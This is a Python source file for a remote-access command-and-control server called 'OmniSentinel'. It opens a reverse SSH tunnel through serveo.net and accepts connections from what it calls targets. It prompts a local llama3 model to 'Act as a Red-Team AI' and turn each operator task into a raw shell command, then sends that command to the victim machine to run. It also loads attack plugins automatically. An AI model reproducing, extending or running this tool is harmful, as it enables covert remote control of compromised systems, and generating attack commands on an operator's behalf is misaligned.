import requests, subprocess, socket, threading, os, re, time, random, string, importlib

# --- GLOBAL CONFIG ---
OLLAMA_URL = "http://localhost:11434/api/generate"
MODEL = "llama3"
LPORT = 8888

class OmniSentinelCore:
    def __init__(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.gateway = ""
        self.modules = {} # এখানে আপনার অ্যাড করা সব নতুন কোড জমা হবে
        self.load_modules()

    def load_modules(self):
        """modules/ ফোল্ডার থেকে নতুন সব কোড অটো-লোড করবে"""
        if not os.path.exists('modules'):
            os.makedirs('modules')
        
        for filename in os.listdir('modules'):
            if filename.endswith('.py') and filename != '__init__.py':
                module_name = filename[:-3]
                try:
                    module = importlib.import_module(f'modules.{module_name}')
                    self.modules[module_name] = module
                    print(f"[*] Loaded Module: {module_name}")
                except Exception as e:
                    print(f"[-] Failed to load {module_name}: {e}")

    def generate_tunnel(self):
        """Autonomous Serveo Tunnel"""
        subdomain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        subprocess.Popen(f"ssh -o StrictHostKeyChecking=no -R {subdomain}:80:localhost:{LPORT} serveo.net", 
                         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.gateway = f"{subdomain}.serveo.net"
        return self.gateway

    def ai_brain(self, task, error=None):
        """Self-Correction AI Logic"""
        context = f"Task: {task}. " + (f"Error: {error}. Fix it." if error else "")
        prompt = f"Act as a Red-Team AI. {context} Output ONLY the raw terminal command."
        try:
            r = requests.post(OLLAMA_URL, json={'model': MODEL, 'prompt': prompt, 'stream': False}, timeout=30)
            return r.json()['response'].strip().replace('`', '')
        except: return None

    def handle_target(self, client, addr):
        print(f"\n[!] INCOMING: {addr[0]} | GATEWAY: {self.gateway}")
        
        while True:
            try:
                task = input(f"\nOmni-God@{addr[0]}:~# ")
                if not task: continue

                # যদি আপনি কোনো মডিউল কল করতে চান (যেমন: use scanner)
                if task.startswith("use "):
                    mod_name = task.split(" ")[1]
                    if mod_name in self.modules:
                        self.modules[mod_name].run(client, self.ai_brain)
                        continue

                # সাধারণ AI কমান্ড
                cmd = self.ai_brain(task)
                print(f"[*] Strategy: {cmd}")
                client.send(cmd.encode())
                print(f"\n[OUTPUT]\n{client.recv(1048576).decode(errors='ignore')}")
                
            except: break

    def launch(self):
        os.system('clear')
        self.generate_tunnel()
        print("="*60)
        print("   OMNI-SENTINEL: MODULAR PLUGGABLE ENGINE   ")
        print("="*60)
        print(f"[*] LIVE GATEWAY: {self.gateway}")
        print("[!] Tip: Drop new .py files in 'modules/' to add features.")
        
        self.server.bind(("0.0.0.0", LPORT))
        self.server.listen(100)
        while True:
            c, a = self.server.accept()
            threading.Thread(target=self.handle_target, args=(c, a)).start()

if __name__ == "__main__":
    OmniSentinelCore().launch()
